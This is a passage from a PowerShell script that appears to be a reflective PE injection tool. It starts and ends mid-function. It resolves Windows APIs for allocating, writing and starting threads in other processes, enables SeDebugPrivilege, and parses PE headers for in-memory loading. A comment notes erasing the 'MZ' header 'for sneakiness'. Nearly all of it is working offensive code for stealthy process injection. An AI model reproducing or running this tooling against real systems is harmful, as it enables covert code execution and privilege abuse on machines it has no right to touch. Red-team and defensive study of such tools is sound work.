		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}

	Function Get-Win32Functions
	{
		$Win32Functions = New-Object System.Object
		
		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
		
		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
		
		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
		
		$memsetAddr = Get-ProcAddress msvcrt.dll memset
		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
		
		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
		
		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
		
		$GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
		$GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		$GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
		
		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
		
		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
		
		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
		
		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
		
		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		$FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
		
		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
		
		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
		
		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
		
		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
		
		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
		
		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
		
		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
		
		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
		
		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
		
		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
		
		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
		
		$NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
        $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
        $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
		
		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
		
		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
		
		return $Win32Functions
	}
	#####################################

			
	#####################################
	###########    HELPERS   ############
	#####################################

	#Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
	#This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				$Val = $Value1Bytes[$i] - $CarryOver
				#Sub bytes
				if ($Val -lt $Value2Bytes[$i])
				{
					$Val += 256
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
				
				
				[UInt16]$Sum = $Val - $Value2Bytes[$i]

				$FinalBytes[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				#Add bytes
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			{
				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				{
					return $true
				}
				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		
		return $false
	}
	

	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value #We will determine the type dynamically
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

        return $Hex
    }
	
	
	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$DebugString,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = "EndAddress", Position = 3, Mandatory = $true)]
		[IntPtr]
		$EndAddress,
		
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
		[IntPtr]$FinalEndAddress = [IntPtr]::Zero
		if ($PsCmdlet.ParameterSetName -eq "Size")
		{
			[IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
		}
		else
		{
			$FinalEndAddress = $EndAddress
		}
		
		$PEEndAddress = $PEInfo.EndAddress
		
		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $DebugString"
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $DebugString"
		}
	}
	
	
	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$MemoryAddress
		)
	
		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		}
	}
	

	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $TypeBuilder.CreateType()
	}


	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    # Get a reference to System.dll in the GAC
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    # Get a reference to the GetModuleHandle and GetProcAddress methods
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	    # Get a handle to the module specified
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    # Return the address of the function
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}
	
	
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		
		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if ($Result -eq $false)
		{
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				if ($Result -eq $false)
				{
					Throw "Unable to impersonate self"
				}
				
				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if ($Result -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($Result -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}

		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		$TokenPrivileges.PrivilegeCount = 1
		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		if (($Result -eq $false) -or ($ErrorCode -ne 0))
		{
			#Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}
	
	
	Function Create-RemoteThread
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$ProcessHandle,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$ArgumentPtr = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		
		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
		
		$OSVersion = [Environment]::OSVersion.Version
		#Vista and Win7
		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		{
			#Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
			}
		}
		#XP/Win8
		else
		{
			#Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		}
		
		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		{
			Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
		}
		
		return $RemoteThreadHandle
	}

	

	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$NtHeadersInfo = New-Object System.Object
		
		#Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

		#Get IMAGE_NT_HEADERS
		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
		
		#Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
	    if ($imageNtHeaders64.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		
		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $NtHeadersInfo
	}


	#This function will get the information needed to allocated space in memory for the PE
	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		$PEInfo = New-Object System.Object
		
		#Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
		
		#Get NtHeadersInfo
